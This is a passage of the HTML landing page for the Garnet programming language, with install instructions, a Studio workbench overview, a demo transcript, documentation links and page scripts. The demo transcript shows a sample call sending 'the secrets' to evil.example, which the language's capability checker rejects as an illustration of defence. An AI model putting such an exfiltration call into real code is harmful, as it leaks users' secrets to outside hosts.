x=document.getElementById(\'os-detect-x\');\n        if(!el||!msg)return;\n        try{ if(sessionStorage.getItem(\'garnet-osbanner-dismissed\')===\'1\')return; }catch(e){}\n        var uad=navigator.userAgentData;\n        var plat=(uad&&uad.platform)?uad.platform:(navigator.platform||\'\');\n        var s=(plat+\' \'+(navigator.userAgent||\'\')).toLowerCase();\n        var t=\'\';\n        if(s.indexOf(\'mac\')>-1) t=\'Detected: macOS — the universal installer uses the checksum-verified v0.8.2 CLI tarball for Apple Silicon or Intel, with source fallback. A signed .pkg is not published.\';\n        else if(s.indexOf(\'win\')>-1) t=\'Detected: Windows — run install.ps1 (Windows tab) to install the checksum-verified v0.8.2 x86_64 build; the source install needs Rust 1.95+.\';\n        else if(s.indexOf(\'linux\')>-1||s.indexOf(\'android\')>-1) t=\'Detected: Linux — the universal installer uses the checksum-verified v0.8.2 package for x86_64 or ARM64 (.deb, .rpm or tarball); other targets fall back to source.\';\n        if(!t)return; // unknown platform → no banner, silent\n        msg.textContent=t;\n        el.hidden=false; el.style.display=\'flex\';\n        if(x) x.addEventListener(\'click\',function(){ el.style.display=\'none\'; try{sessionStorage.setItem(\'garnet-osbanner-dismissed\',\'1\');}catch(e){} });\n      }catch(e){ /* silent degrade — never block the install section */ }\n    })();\n    </script>\n\n    <div class="install-note" style="margin:8px 0 26px;padding:16px 18px;border:1px solid var(--rule);border-radius:10px;background:var(--bg-soft);font-size:14.5px;color:var(--ink-soft);">\n      <strong style="color:var(--ink);">Before you install.</strong> Prebuilt release packages need <em>no toolchain</em>. The <em>source</em> install needs <strong>Rust 1.95+</strong>; CI also tracks current stable. The latest tagged release is <strong>v0.8.2</strong>, a research-grade milestone. Its assets are below; <code>SHA256SUMS</code> is GPG-signed (verify per docs/release-signing.md), and older releases stay on GitHub Releases:\n      <table style="border-collapse:collapse;margin:12px 0 4px;font-size:13.5px;width:100%;">\n        <tr style="color:var(--ink);"><th style="text-align:left;padding:4px 10px;border-bottom:1px solid var(--rule);">Platform</th><th style="text-align:left;padding:4px 10px;border-bottom:1px solid var(--rule);">v0.8.2 asset</th><th style="text-align:left;padding:4px 10px;border-bottom:1px solid var(--rule);">Install path</th></tr>\n        <tr><td style="padding:4px 10px;">macOS · Apple Silicon</td><td style="padding:4px 10px;"><code>garnet-0.8.2-aarch64-apple-darwin.tar.gz</code></td><td style="padding:4px 10px;">install.sh or the tarball; no signed .pkg</td></tr>\n        <tr><td style="padding:4px 10px;">macOS · Intel</td><td style="padding:4px 10px;"><code>garnet-0.8.2-x86_64-apple-darwin.tar.gz</code></td><td style="padding:4px 10px;">install.sh or the tarball; no signed .pkg</td></tr>\n        <tr><td style="padding:4px 10px;">Linux x86_64</td><td style="padding:4px 10px;"><code>garnet_0.8.2-1_amd64.deb</code> · <code>garnet-0.8.2-1.x86_64.rpm</code> · <code>garnet-0.8.2-x86_64-unknown-linux-gnu.tar.gz</code></td><td style="padding:4px 10px;">install.sh, a package or the tarball</td></tr>\n        <tr><td style="padding:4px 10px;">Linux ARM64</td><td style="padding:4px 10px;"><code>garnet_0.8.2-1_arm64.deb</code> · <code>garnet-0.8.2-1.aarch64.rpm</code> · <code>garnet-0.8.2-aarch64-unknown-linux-gnu.tar.gz</code></td><td style="padding:4px 10px;">install.sh, a package or the tarball</td></tr>\n        <tr><td style="padding:4px 10px;">Windows x86_64</td><td style="padding:4px 10px;"><code>garnet-0.8.2-x86_64-pc-windows-msvc.zip</code></td><td style="padding:4px 10px;">install.ps1 or the zip; no .msi</td></tr>\n      </table>\n      <div style="margin-top:10px;">The Linux packages and tarballs need glibc 2.39 or newer (Ubuntu 24.04+, Debian 13+, Fedora 40+); on older distributions use the source install.</div>\n      <div style="margin-top:10px;">Verify any manual download before running it (from the folder containing the asset and <code>SHA256SUMS</code>):</div>\n<pre style="margin:8px 0 0;">shasum -a 256 --ignore-missing -c SHA256SUMS</pre>\n    </div>\n\n    <div class="tabs install-tabs-bar" role="tablist">\n      <button class="tab active" data-install="universal">Universal</button>\n      <button class="tab" data-install="macos">macOS</button>\n      <button class="tab" data-install="linux">Linux</button>\n      <button class="tab" data-install="windows">Windows</button>\n    </div>\n\n    <div class="install-tabs">\n      <div class="install-pane active" data-pane="universal">\n        <div class="install-wrap">\n          <button class="copy" data-copy="curl --proto \'=https\' --tlsv1.2 -sSf https://garnet-lang.org/install.sh | sh">Copy</button>\n<pre># Universal installer:\ncurl --proto \'=https\' --tlsv1.2 -sSf https://garnet-lang.org/install.sh | sh\n\n# Force native release package only:\ncurl --proto \'=https\' --tlsv1.2 -sSf https://garnet-lang.org/install.sh | GARNET_INSTALL_MODE=release sh\n\n# Force source install:\ncurl --proto \'=https\' --tlsv1.2 -sSf https://garnet-lang.org/install.sh | GARNET_INSTALL_MODE=source sh</pre>\n        </div>\n      </div>\n      <div class="install-pane" data-pane="macos">\n        <div class="install-wrap">\n          <button class="copy" data-copy="curl --proto \'=https\' --tlsv1.2 -sSf https://garnet-lang.org/install.sh | sh">Copy</button>\n<pre># Recommended — universal installer:\n# installs the checksum-verified v0.8.2 CLI tarball and otherwise falls back\n# to source install. A signed .pkg / notarization is not published.\ncurl --proto \'=https\' --tlsv1.2 -sSf https://garnet-lang.org/install.sh | sh\n\n# Source install (any arch, needs a Rust toolchain):\ngit clone https://github.com/Island-Dev-Crew/garnet && cd garnet/garnet-cli && cargo install --path .\n\n# For Apple distribution evidence, see status.html.</pre>\n        </div>\n      </div>\n      <div class="install-pane" data-pane="linux">\n        <div class="install-wrap">\n          <button class="copy" data-copy="curl --proto \'=https\' --tlsv1.2 -sSf https://garnet-lang.org/install.sh | sh">Copy</button>\n<pre># Recommended — universal installer (SHA256SUMS-verified):\ncurl --proto \'=https\' --tlsv1.2 -sSf https://garnet-lang.org/install.sh | sh\n\n# Published v0.8.2 release assets:\n#   https://github.com/Island-Dev-Crew/garnet/releases/tag/v0.8.2\n\n# Debian/Ubuntu (on ARM64: garnet_0.8.2-1_arm64.deb):\nsudo apt install ./garnet_0.8.2-1_amd64.deb\n\n# Fedora/RHEL (on ARM64: garnet-0.8.2-1.aarch64.rpm):\nsudo dnf install ./garnet-0.8.2-1.x86_64.rpm\n\n# Source install (any arch, needs a Rust toolchain):\ngit clone https://github.com/Island-Dev-Crew/garnet && cd garnet/garnet-cli && cargo install --path .</pre>\n        </div>\n      </div>\n      <div class="install-pane" data-pane="windows">\n        <div class="install-wrap">\n          <button class="copy" data-copy="irm https://garnet-lang.org/install.ps1 | iex">Copy</button>\n<pre># PowerShell (Windows PowerShell 5.1 or PowerShell 7+):\n# installs the v0.8.2 x86_64 build after verifying it against SHA256SUMS.\nirm https://garnet-lang.org/install.ps1 | iex\n\n# Source install (needs a Rust toolchain):\ngit clone https://github.com/Island-Dev-Crew/garnet && cd garnet/garnet-cli && cargo install --path .</pre>\n        </div>\n      </div>\n    </div>\n\n    <p class="lead" style="margin-top:32px;font-size:15px;">See it run — the real first-project loop:</p>\n    <div class="garnet-term" id="garnet-term" role="img" aria-label="Terminal: garnet new --template cli my_app; cd my_app; garnet test (2 passed); garnet run src/main.garnet" style="border:1px solid var(--rule);border-radius:10px;background:#0b0b0f;overflow:hidden;font-family:var(--mono);font-size:13px;line-height:1.7;">\n      <div style="display:flex;gap:7px;padding:10px 14px;border-bottom:1px solid var(--rule);background:var(--bg-soft);">\n        <span style="width:11px;height:11px;border-radius:50%;background:#ff5f56;display:inline-block;"></span>\n        <span style="width:11px;height:11px;border-radius:50%;background:#ffbd2e;display:inline-block;"></span>\n        <span style="width:11px;height:11px;border-radius:50%;background:#27c93f;display:inline-block;"></span>\n        <span style="color:var(--ink-muted);margin-left:8px;font-size:12px;">zsh — garnet</span>\n      </div>\n      <pre id="garnet-term-body" style="margin:0;padding:16px 18px;color:var(--code-fg);white-space:pre-wrap;min-height:210px;"><span style="color:var(--accent-text)">$</span> garnet new --template cli my_app\n  created my_app/ (cli template)\n<span style="color:var(--accent-text)">$</span> cd my_app\n<span style="color:var(--accent-text)">$</span> garnet test\n  test test_arithmetic ... ok\n  test test_string_interpolation ... ok\n\n  test result: ok. 2 passed; 0 failed; in 2 file(s)\n<span style="color:var(--accent-text)">$</span> garnet run src/main.garnet\n  Edit src/main.garnet to change this message.\n  =&gt; 0</pre>\n    </div>\n    <script>\n    (function(){\n      // Progressive enhancement: the real captured session is already in\n      // the DOM above, so it is never empty for no-JS, crawlers, or\n      // reduced-motion. Only clear + retype it as a flourish when motion\n      // is allowed and IntersectionObserver is available.\n      var term=document.getElementById(\'garnet-term\');\n      var body=document.getElementById(\'garnet-term-body\');\n      if(!term||!body)return;\n      var reduce=window.matchMedia&&window.matchMedia(\'(prefers-reduced-motion: reduce)\').matches;\n      if(reduce||!(\'IntersectionObserver\' in window))return;\n      var lines=body.innerHTML.split(\'\\n\');\n      body.innerHTML=\'\';\n      var i=0;\n      function step(){\n        if(i>=lines.length)return;\n        body.innerHTML += (i?\'\\n\':\'\') + lines[i];\n        i++;\n        setTimeout(step, lines[i-1].indexOf(\'$\')>-1?520:240);\n      }\n      var io=new IntersectionObserver(function(es){\n        es.forEach(function(e){ if(e.isIntersecting){ io.disconnect(); step(); }});\n      },{threshold:0.35});\n      io.observe(term);\n    })();\n    </script>\n    <p class="lead" style="margin-top:32px;font-size:15px;">After install, scaffold a project:</p>\n    <div class="install-pane active" style="display:block;">\n      <div class="install-wrap">\n        <button class="copy" data-copy="garnet new --template cli my_app\ncd my_app\ngarnet test\ngarnet run src/main.garnet">Copy</button>\n<pre>garnet new --template cli my_app\ncd my_app\ngarnet test           # 2 starter tests pass green\ngarnet run src/main.garnet</pre>\n      </div>\n    </div>\n\n    <p style="margin-top:22px;"><a href="getting-started.html" class="btn btn-ghost">New here? Follow the Getting Started walkthrough →</a></p>\n\n    <p class="lead" style="margin-top:32px;font-size:15px;">Keeping Garnet updated:</p>\n    <div class="install-note" style="margin:8px 0 0;padding:16px 18px;border:1px solid var(--rule);border-radius:10px;background:var(--bg-soft);font-size:14.5px;color:var(--ink-soft);">\n      Today, update by re-running the universal installer (it replaces the installed binary), or <code>git pull</code> then <code>cargo install --path .</code> for a source build. A first-class toolchain manager — <code>garnet update</code>, <code>stable</code>/<code>nightly</code> channels, and <code>garnet self uninstall</code> — is <strong>planned and not yet available</strong>. This section will change when it ships; it is listed here so the roadmap stays explicit, not so the commands look real.\n    </div>\n  </div>\n</section>\n\n<!-- ═══════════════════════════════════════════════════════ STUDIO -->\n<section id="studio" class="dense">\n  <div class="container reveal">\n    <h3>Garnet Studio workbench</h3>\n    <h2>Open the language as an app, <span class="accent">not just a terminal.</span></h2>\n    <p class="lead">The macOS Studio surface is a source-checkout workbench for real Garnet flows — not a separate product. It runs:</p>\n    <ul style="columns:2;column-gap:34px;color:var(--ink-soft);font-size:14px;line-height:1.65;padding-left:18px;margin:6px 0 14px;">\n      <li>health checks &amp; runnable examples</li>\n      <li>the deterministic converter</li>\n      <li>planned-language <strong>Assist Plan</strong></li>\n      <li>provider-neutral <strong>Advisory Bundle</strong> packaging</li>\n      <li>local <strong>Advisory Review</strong> gating</li>\n      <li>source-free <strong>Advisory Handoff</strong> packets</li>\n      <li><strong>Provider Options</strong> registry evidence</li>\n      <li>the <strong>Objective Pulse</strong> readiness %</li>\n      <li>a manifested <strong>Demo Route</strong> for demo rehearsal</li>\n      <li>manifested <strong>Deck Outline</strong> + smokeable <strong>Deck Preview</strong></li>\n      <li>the <strong>Continuation Pulse</strong> for Mac-side next steps</li>\n      <li>release status &amp; the agentic dogfood matrix</li>\n    </ul>\n    <p class="lead" style="font-size:15px;">In Codex Desktop, a <strong>Codex Run</strong> action wires <code>script/build_and_run.sh</code> to build SwiftPM, stage <code>dist/Garnet Studio.app</code>, and launch it.</p>\n    <p class="lead">The Windows/Linux lane now has a separate Tauri v2 shell scaffold under <code>apps/garnet-studio</code>. Windows local proof covers the Vite frontend build, Tauri backend tests, release executable, unsigned NSIS bundle, <code>--studio-smoke</code> Desktop evidence, a Release / Readiness panel wired to the repo-native v0.5 reporters, verified x64 clean-VM installer proof, WSL package/window portability evidence, Studio Domain Proof Matrix shell output, and Release / Readiness shell reporter output. Native (non-WSL) Debian ARM64 has a build, install and headless launch proof (<code>proofs/linux/studio/utm-native-20260701</code>). It is still not signed MSI, winget, Linux x64 or desktop-session GUI launch proof, live Release / Readiness GUI screenshot proof, Windows ARM64 proof, or completed cross-platform package proof.</p>\n\n    <div class="features">\n      <div class="feature">\n        <div class="icon">Run</div>\n        <h4>One Local App Loop</h4>\n        <p>Use the Codex Run action or <code>./script/build_and_run.sh --verify</code> to build, launch, and prove the app process from the checkout.</p>\n      </div>\n      <div class="feature">\n        <div class="icon">Assist</div>\n        <h4>Migration Planning</h4>\n        <p>Studio exposes <code>Assist Plan</code>, <code>Advisory Bundle</code>, <code>Advisory Review</code>, and <code>Advisory Handoff</code> for TypeScript, JavaScript, Swift, Java, C, C++, C#, Perl, Kotlin, Shell, SQL, and Other as local planning, review, and source-free handoff evidence written to a local evidence folder, not active conversion.</p>\n      </div>\n      <div class="feature">\n        <div class="icon">Pulse</div>\n        <h4>Objective Pulse</h4>\n        <p>The Release panel can run the repo-native readiness reporter and generate manifested demo-route, deck-outline, and browser-smokeable deck-preview bundles, keeping presentation rehearsal separate from the completed tracked-slice ledger and final acceptance. Detailed signing, notarization, clean-machine Gatekeeper evidence, and the machine-readable preflight status reporter stay on the readiness status page.</p>\n      </div>\n      <div class="feature">\n        <div class="icon">Next</div>\n        <h4>Continuation Pulse</h4>\n        <p>The Release panel can show which Mac-side lanes can still move from this checkout and which gates belong to Apple credentials or Windows/Linux runtime proof.</p>\n      </div>\n    </div>\n\n    <div class="install-pane active" style="display:block;margin-top:28px;">\n      <div class="install-wrap">\n        <button class="copy" data-copy="./script/build_and_run.sh --verify">Copy</button>\n<pre># From a source checkout:\n./script/build_and_run.sh --verify\n\n# Codex Desktop:\n# click Run, which calls ./script/build_and_run.sh\n\n# Output bundle:\ndist/Garnet Studio.app</pre>\n      </div>\n    </div>\n  </div>\n</section>\n\n<!-- ═══════════════════════════════════════ RECORDED DEMONSTRATION -->\n<section id="demonstration" class="dense">\n  <div class="container reveal">\n    <h3>Recorded demonstration</h3>\n    <h2>Eighty seconds, <span class="accent">end to end</span>.</h2>\n    <p class="lead">One pass through the whole idea: the browser playground refuses an undeclared network call, the command line names the authority a change would declare and shows that comparing a file with itself reports no authority expansion, and a seal emits an unsigned in-toto Statement.</p>\n\n    <div class="promo-frame">\n      <video class="promo-video" controls preload="metadata" poster="assets/garnet-demonstration-poster.jpg" width="1920" height="1080">\n        <source src="assets/garnet-demonstration.mp4" type="video/mp4">\n        <p>Download the recorded demonstration: <a href="assets/garnet-demonstration.mp4">MP4</a>.</p>\n      </video>\n    </div>\n\n    <details class="transcript">\n      <summary>Text version of the recording</summary>\n      <ol>\n        <li><strong>0:06 — the browser playground.</strong> In <em>Custom source</em>: <code>@caps()</code> / <code>def main() {</code> / <code>net::tcp_connect("evil.example:443", "the secrets")</code> / <code>0</code> / <code>}</code>. <em>Check</em> returns <code>check.caps_coverage</code>: &ldquo;caps coverage: function `main` does not declare `net` but transitively calls `net::tcp_connect` which requires it&rdquo;. The status shown is the page\'s, not a process exit code.</li>\n        <li><strong>0:29 — a wider declaration.</strong> <code>garnet diff-caps --machine before.garnet after.garnet</code>, where <code>before</code> is <code>@caps()</code> <code>def main() { 0 }</code> and <code>after</code> is <code>@caps(net)</code> <code>def main() { 0 }</code>. Verdict <code>authority-expanded</code>, <code>exit_code</code> 1, <code>aggregate_gained</code> <code>["net"]</code>, scope &ldquo;declared-surface-only; does not prove absence of undeclared authority&rdquo;.</li>\n        <li><strong>0:39 — the control.</strong> <code>garnet diff-caps --machine before.garnet before.garnet</code>: verdict <code>no-authority-expansion</code>, <code>exit_code</code> 0, nothing gained.</li>\n        <li><strong>0:46 — the seal.</strong> <code>garnet seal hello.garnet --out hello.seal.json</code> on <code>@caps()</code> <code>def main() { "Hello, world!" }</code>. It reports &ldquo;predicate written to hello.seal.json&rdquo; and &ldquo;cosign not installed — in-toto predicate emitted UNSIGNED&rdquo;.</li>\n        <li><strong>0:59 — inspecting it.</strong> <code>jq</code> shows <code>_type</code> <code>https://in-toto.io/Statement/v1</code>, subject <code>hello</code> with a BLAKE3 digest, and <code>predicateType</code> <code>https://garnet-lang.org/attestation/seal/v1</code>.</li>\n      </ol>\n    </details>\n\n    <p class="evidence-note">A local recording, take-03, made on macOS arm64 on 2026-09-07. The check runs in the browser playground as deployed on 2026-09-07; that package has since been rebuilt, so it is not the package this page serves today, and the status it shows is not a process exit code. The diff, the unchanged control and the seal run on a <strong>source build of the CLI at main <code>452a0e2</code></strong> (binary sha256 <code>e548b0d9&hellip;</code>), not the released <code>v0.8.1</code> binary. It is not independent review and not a launch clearance, and its opening and closing cards still carry the capture\'s own <em>unpublished&nbsp;·&nbsp;hold</em> stamp, set before its publication was decided. Its receipt &mdash; status <code>captured-pass-scoped</code>, recording sha256 <code>40db808f&hellip;</code>, of which this MP4 is a frame-for-frame H.264 encoding &mdash; is not yet published with it. Check and diff run in the <a href="#try">playground on this page</a>; seal needs a build from <a href="#install">Install</a>.</p>\n  </div>\n</section>\n\n<!-- ═══════════════════════════════════════════════════════ READINESS -->\n<section id="readiness" class="dense">\n  <div class="container reveal">\n    <div class="section-head"><h3>Readiness</h3><a class="section-offer" href="status.html">Full status page <span aria-hidden="true">&rarr;</span></a></div>\n    <h2>The numbers live on <span class="accent">Status</span>.</h2>\n    <p class="lead">A landing page is a poor place for a scoreboard: the figures move, the caveats do not fit, and a number without its derivation is decoration. Test counts, tracked slices, the productization percentage, and every platform\'s own gate are kept on one page, each beside the command that produced it and the limits that still apply.</p>\n    <div style="margin-top:26px;display:flex;align-items:center;gap:18px;flex-wrap:wrap">\n      <a href="status.html" class="btn btn-primary">Open the status page <span aria-hidden="true">&rarr;</span></a>\n      <a href="governance.html" class="btn btn-ghost">How a change gets accepted <span aria-hidden="true">&rarr;</span></a>\n    </div>\n    <p class="evidence-note">Objective accounting: the tracked implementation plan is complete, while platform distribution, provider-backed assist, backend lowering, proof, and empirical validation remain separately gated. Garnet is research-grade v<!-- truth:version -->0.8.2<!-- /truth --> and not production or 1.0.</p>\n  </div>\n</section>\n\n<!-- ═══════════════════════════════════════════════════════ DOCS -->\n<section id="docs">\n  <div class="container reveal">\n    <h3>Documentation &amp; Research</h3>\n    <h2>The work, the proofs, the <span class="accent">evidence scorecard</span>.</h2>\n    <p class="lead">Garnet ships seven research papers plus four addenda. Where claims are empirical, evidence is traceable to reproducible artifacts; empirical claims are labeled by confidence and status, with partial outcomes explicitly downgraded in the v4.0 revisions.</p>\n\n    <div class="doc-cards">\n      <a href="minispec.html" class="doc-card">\n        <div class="label">Specification</div>\n        <h4>Mini-Spec v1.0</h4>\n        <p>The canonical language specification. Grammar, type system, mode boundary, capability inventory, deterministic build manifest.</p>\n      </a>\n      <a href="stdlib.html" class="doc-card">\n        <div class="label">Reference</div>\n        <h4>Stdlib Primitive Registry</h4>\n        <p>The current capability-tagged primitive table: pure string/array/crypto helpers plus explicit time, file, network, environment and process authority.</p>\n      </a>\n      <a href="synthesis.html" class="doc-card">\n        <div class="label">The Reconciliation</div>\n        <h4>Paper III — Synthesis</h4>\n        <p>Rust + Ruby → Garnet. The dual-mode design rationale, the mode boundary as a first-class construct, the capability model.</p>\n      </a>\n      <a href="novel.html" class="doc-card">\n        <div class="label">Empirical</div>\n        <h4>Paper VI — Novel Frontiers</h4>\n        <p>Seven novel contributions, pre-registered Phase 1C, executed Phase 4A. Evidence scorecard: 4 supported, 2 partial, 0 refuted, 1 pending-infra. The measured results for experiments 2–6 cannot be reproduced from this repository: experiments 2, 4, 5 and 6 have no committed harness, and the experiment 3 harness does not include the measured run.</p>\n      </a>\n      <a href="ladder.html" class="doc-card">\n        <div class="label">DX Study</div>\n        <h4>Comparative DX Paper</h4>\n        <p>Side-by-side Rust / Ruby / Garnet across 10 patterns. The §20 chapter explicitly separates measured claims from argued claims.</p>\n      </a>\n      <a href="cra-article-14.html" class="doc-card">\n        <div class="label">Positioning</div>\n        <h4>CRA Article 14</h4>\n        <p>What the EU Cyber Resilience Act asks a reporting obligation to produce, and which of those artifacts Garnet already emits. Positioning, not a launch claim.</p>\n      </a>\n      <a href="omarchy.html" class="doc-card">\n        <div class="label">Union</div>\n        <h4>Garnet &times; Omarchy</h4>\n        <p>The one real seam between the two: skills linked into four harness directories by the same idiom the evidence repository installs with. Not affiliated.</p>\n      </a>\n    </div>\n  </div>\n</section>\n\n<!-- ═══════════════════════════════════════════════════════ FOOTER -->\n<section id="community" class="dense">\n  <div class="container reveal">\n    <h3>Community</h3>\n    <h2>Ask, report, contribute.</h2>\n    <p class="lead">Garnet is early and the community surface states the current truth. <strong>GitHub Discussions are live</strong> as of v0.5.0 — that\'s where design conversations, show &amp; tell, and RFCs happen. A Discord/chat server is not — chat will only appear here when contributor volume sustains it.</p>\n    <div class="links" style="display:flex;flex-wrap:wrap;gap:18px 28px;margin-top:18px;font-size:15px;">\n      <a href="https://github.com/Island-Dev-Crew/garnet/discussions" target="_blank" rel="noopener noreferrer"><strong>Discussions → ask, propose, show &amp; tell</strong></a>\n      <a href="getting-started.html">Getting Started walkthrough</a>\n      <a href="https://github.com/Island-Dev-Crew/garnet/issues" target="_blank" rel="noopener noreferrer">Questions &amp; bug reports → GitHub Issues</a>\n      <a href="https://github.com/Island-Dev-Crew/garnet/blob/main/CONTRIBUTING.md" target="_blank" rel="noopener noreferrer">Contributing guide</a>\n      <a href="https://github.com/Island-Dev-Crew/garnet/blob/main/SECURITY.md" target="_blank" rel="noopener noreferrer">Security disclosure</a>\n      <a href="blog/">Blog</a>\n      <a href="playground.html">Playground (runs in your browser)</a>\n    </div>\n    <p class="lead" style="margin-top:16px;font-size:13.5px;color:var(--ink-muted);">Threads to start with: <a href="https://github.com/Island-Dev-Crew/garnet/discussions/204" target="_blank" rel="noopener noreferrer">Welcome</a> · <a href="https://github.com/Island-Dev-Crew/garnet/discussions/205" target="_blank" rel="noopener noreferrer">Show &amp; tell — what are you building</a> · <a href="https://github.com/Island-Dev-Crew/garnet/discussions/206" target="_blank" rel="noopener noreferrer">RFC — package registry shape</a>.</p>\n  </div>\n</section>\n\n<footer>\n  <div class="container">\n    <div class="builtby-row"><a class="builtby" href="https://islanddevcrew.com" aria-label="Built by Island Dev Crew"><img src="assets/idc-palm-logo-64.webp" width="30" height="30" alt="" loading="lazy" decoding="async"><span>Built by <b>Island Dev Crew</b></span></a></div>\n    <div class="verse">"Where there is no vision, the people perish." — Proverbs 29:18</div>\n    <div class="links">\n      <a href="https://github.com/Island-Dev-Crew/garnet" target="_blank" rel="noopener noreferrer">GitHub</a>\n      <a href="#docs">Documentation</a>\n      <a href="https://github.com/Island-Dev-Crew/garnet/releases" target="_blank" rel="noopener noreferrer">Releases</a>\n      <a href="https://github.com/Island-Dev-Crew/garnet/blob/main/SECURITY.md" target="_blank" rel="noopener noreferrer">Security</a>\n      <a href="https://github.com/Island-Dev-Crew/garnet/blob/main/CODE_OF_CONDUCT.md" target="_blank" rel="noopener noreferrer">Code of Conduct</a>\n      <a href="logo-policy.html">Logo Policy</a>\n      <a href="governance.html">Governance</a>\n      <a href="funding.html">Funding</a>\n    </div>\n    <div class="copyright">\n      © 2026 Island Development Crew · Dual-licensed MIT OR Apache-2.0 · garnet-lang.org\n    </div>\n    <div class="copyright" style="margin-top:6px;font-size:12px;">\n      Latest tag Garnet <!-- truth:latest_tag -->v0.8.2<!-- /truth --> (research-grade milestone; the Release ships CLI binaries for macOS, Linux and Windows, checksum-verified against a GPG-signed SHA256SUMS, plus an SBOM)\n    </div>\n    <div class="copyright" style="margin-top:6px;font-size:12px;">\n      No social accounts yet — follow development by watching the <a href="https://github.com/Island-Dev-Crew/garnet" target="_blank" rel="noopener noreferrer">repository</a>.\n    </div>\n    <div class="copyright" style="margin-top:6px;font-size:12px;">\n      🌐 English only\n    </div>\n  </div>\n</footer>\n\n<script>\n  // ─── Smooth scroll on nav ─────────────────────────────────────\n  document.querySelectorAll(\'a[href^="#"]:not([data-page])\').forEach(a => {\n    a.addEventListener(\'click\', e => {\n      const id = a.getAttribute(\'href\').slice(1);\n      if (!id) return;\n      const target = document.getElementById(id);\n      if (!target) return;\n      e.preventDefault();\n      const calm = window.matchMedia(\'(prefers-reduced-motion: reduce)\').matches;\n      target.scrollIntoView({ behavior: calm ? \'auto\' : \'smooth\', block: \'start\' });\n    });\n  });\n\n  // ─── Playground: mount the committed runtime only when asked ──\n  const pgLoad = document.getElementById(\'pg-load\');\n  if (pgLoad) {\n    pgLoad.addEventListener(\'click\', ev => {\n      ev.preventDefault();\n      const mount = document.getElementById(\'pg-mount\');\n      const frame = document.createElement(\'iframe\');\n      frame.src = \'playground.html\';\n      frame.title = \'Garnet playground — run, check, and diff capabilities in your browser\';\n      frame.loading = \'lazy\';\n      mount.classList.add(\'loaded\');\n      mount.replaceChildren(frame);\n      frame.focus();\n    });\n  }\n\n  // ─── Reveal-on-scroll ─────────────────────────────────────────\n  const io = new IntersectionObserver(entries => {\n    entries.forEach(en => {\n      if (en.isIntersecting) {\n        en.target.classList.add(\'in\');\n        io.unobserve(en.target);\n      }\n    });\n  }, { threshold: 0.01 });\n  document.querySelectorAll(\'.reveal\').forEach(el => io.observe(el));\n\n  // ─── Tabs: roles, state and keyboard, for both tab groups ─────\n  function initTabs(key, paneSelector, prefix) {\n    const tabs = [...document.querySelectorAll(\'.tab[data-\' + key + \']\')];\n    if (!tabs.length) return;\n    const panes = [...document.querySelectorAll(paneSelector)];\n    tabs.forEach((tab, i) => {\n      const name = tab.dataset[key];\n      const pane = panes.find(p => p.dataset.pane === name);\n      tab.id = prefix + \'-tab-\' + name;\n      tab.setAttribute(\'role\', \'tab\');\n      if (pane) {\n        pane.id = prefix + \'-panel-\' + name;\n        pane.setAttribute(\'role\', \'tabpanel\');\n        pane.setAttribute(\'aria-labelledby\', tab.id);\n        tab.setAttribute(\'aria-controls\', pane.id);\n        // A panel with nothing focusable inside gets a keyboard stop (the WAI-ARIA\n        // tabs pattern). The stop goes on each <pre>, the element that actually\n        // scrolls, so arrow keys scroll the example; the panel is the fallback.\n        if (!pane.querySelector(\'a[href], button, input, select, textarea, [tabindex]\')) {\n          const scrollers = pane.querySelectorAll(\'pre\');\n          if (scrollers.length) scrollers.forEach(pre => { pre.tabIndex = 0; });\n          else pane.tabIndex = 0;\n        }\n      }\n    });\n    const select = (tab, focus) => {\n      tabs.forEach(t => {\n        const on = t === tab;\n        t.classList.toggle(\'active\', on);\n        t.setAttribute(\'aria-selected\', on ? \'true\' : \'false\');\n        t.tabIndex = on ? 0 : -1;\n      });\n      panes.forEach(p => p.classList.toggle(\'active\', p.dataset.pane === tab.dataset[key]));\n      if (focus) tab.focus();\n    };\n    select(tabs.find(t => t.classList.contains(\'active\')) || tabs[0], false);\n    tabs.forEach((tab, i) => {\n      tab.addEventListener(\'click\', () => select(tab, false));\n      tab.addEventListener(\'keydown\', e => {\n        const moves = { ArrowRight: i + 1, ArrowLeft: i - 1, Home: 0, End: tabs.length - 1 };\n        if (!(e.key in moves)) return;\n        e.preventDefault();\n        select(tabs[(moves[e.key] + tabs.length) % tabs.length], true);\n      });\n    });\n  }\n  initTabs(\'tab\', \'.tab-pane[data-pane]\', \'code\');\n  initTabs(\'install\', \'.install-pane[data-pane]\', \'install\');\n\n  // ─── Copy-to-clipboard ────────────────────────────────────────\n  document.querySelectorAll(\'.copy\').forEach(btn => {\n    btn.addEventListener(\'click\', async () => {\n      const text = btn.dataset.copy;\n      try {\n        await navigator.clipboard.writeText(text);\n        const orig = btn.textContent;\n        btn.textContent = \'✓ Copied\';\n        btn.classList.add(\'done\');\n        setTimeout(() => {\n          btn.textContent = orig;\n          btn.classList.remove(\'done\');\n        }, 1800);\n      } catch (e) {\n        btn.textContent = \'⚠ Copy failed\';\n      }\n    });\n  });\n\n  // Keep file:// previews quiet while enabling installability on localhost/HTTPS.\n  if (\'serviceWorker\' in navigator && /^(https?:)$/.test(window.location.protocol)) {\n    window.addEventListener(\'load\', () => {\n      navigator.serviceWorker.register(\'service-worker.js\').catch(() => {});\n    });\n  }\n</script>\n\n<script>\n  // ─── Two-step nav: the first press goes to the section, the next opens its page ──\n  // This is a separate script on purpose. It is an enhancement, and an error in\n  // it must not stop the script above, which reveals the content blocks, mounts\n  // the playground checker, wires the tabs and copy buttons, and registers the\n  // service worker. The whole setup is wrapped in try/catch for the same reason:\n  // if it throws, the four links keep the hrefs they were served with and jump\n  // natively, exactly as they do with JavaScript off.\n  (() => {\n    try {\n      const nav = document.querySelector(\'nav.top\');\n      if (!nav) return;\n      const links = [...nav.querySelectorAll(\'.links a[data-page][data-section]\')];\n      if (!links.length) return;\n\n      const STORE_KEY = \'garnet.nav.twoStep\';   // \'1\' or \'2\' = cues shown so far; \'learned\' = the visitor has used it\n      const CUE_LIMIT = 2;                      // at most twice per visitor\n      const CUE_MS = 8000;\n      const START_WAIT_MS = 3000;               // no scroll ever began: stop waiting for arrival\n      const IDLE_MS = 400;                      // the scroll stopped short of the section: stop waiting\n      const BAND_MIN_PX = 48;                   // the arrival band never collapses on a short viewport\n\n      const calm = () => window.matchMedia(\'(prefers-reduced-motion: reduce)\').matches;\n      const goTo = el => el.scrollIntoView({ behavior: calm() ? \'auto\' : \'smooth\', block: \'start\' });\n      const plainPress = e => e.button === 0 && !(e.metaKey || e.ctrlKey || e.shiftKey || e.altKey);\n      const store = {\n        get() { try { return localStorage.getItem(STORE_KEY) || \'\'; } catch (err) { return \'\'; } },\n        set(value) { try { localStorage.setItem(STORE_KEY, value); } 